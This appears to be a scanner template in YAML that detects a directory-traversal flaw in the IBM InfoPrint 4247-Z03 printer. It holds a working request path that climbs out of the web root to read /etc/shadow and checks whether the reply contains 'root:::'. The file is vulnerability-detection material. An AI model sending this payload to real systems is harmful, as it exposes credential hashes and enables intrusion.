id: IBM InfoPrint Directory Traversal
info:
  author: Harsh Bothra
  name: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Directory Traversal
  severity: Medium
requests:
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - 'root:::'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/./../../../../../../../../../../etc/shadow'
